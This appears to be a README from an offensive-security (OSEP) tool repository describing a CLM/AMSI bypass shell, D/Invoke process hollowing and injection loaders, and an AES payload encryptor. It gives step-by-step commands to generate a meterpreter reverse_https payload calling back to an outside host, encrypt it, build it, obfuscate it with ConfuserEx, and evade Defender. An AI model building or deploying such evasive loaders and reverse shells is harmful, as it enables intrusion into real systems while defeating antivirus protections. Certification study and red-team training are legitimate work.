## InteractiveRunspace.cs

This is used to bypass CLM when you already have access to the system (like a reverse shell or RDP).  It provides a PS shell with AMSI disabled in "FullLanguage" mode that you can interactively execute commands in.


![InteractiveRunSpace Shell](https://github.com/superhac/OSEP/blob/main/images/interactiverunspaceshell.PNG)

## Powershell-Filetransfers-methods.md

Contains a list of PowerShell file transfer methods highlighting if they are "proxy aware" and if they work in when your in "ContrainedLanguageMode".

## dinvoke-phollow-aes.cs

Uses D/Invoke to hollow a process of your choosing. The default is "svchost".  This is based on the work of [FatCyclone D/Invoke in C#](https://github.com/FatCyclone/D-Pwn) with the AV bypasses stripped and I added AES128 ECB encryption.

*Note that msfvenon encoders don't work for this use-case. Do not encode your payload*

1. Create a msfvenom payload
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 EXITFUNC=thread -f raw -o ~/OSEP/shell.raw
```

2. Now AES 128 ECB encrypt your payload: (Note key is 16 chars.  No less or No more.)

```
python aes-encode.py --key 777456789abcdety --format csharp --file shell.raw
```

3. Take the output and put it into the VS project.  Also set your key.  Build it.
4. Then obfuscate with [ConfuserEx](https://github.com/mkaring/ConfuserEx).
5. PWN2OWN

*As of 11/30/2021 this passes Defender*

## dinvoke-pinject-aes.cs

Same as above except it uses process injection.  Default is "explorer". This is based on the work of [FatCyclone D/Invoke in C#](https://github.com/FatCyclone/D-Pwn) with the AV bypasses stripped and I added AES128 ECB encryption.

## aes-encrypt.py

Use this to encrypt you payloads with AES 128 ECB.  

```
# Usage:

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 EXITFUNC=thread -f raw -o ~/OSEP/shell.raw

# python aes-encode.py --key 777456789abcdety --format csharp --file shell.raw

#

# ***** Note don't use msfvenom encoders with d/invoke process hollowing. It crashes process right on startup!!! ***

# Key size is 16 chars! No More or less
```
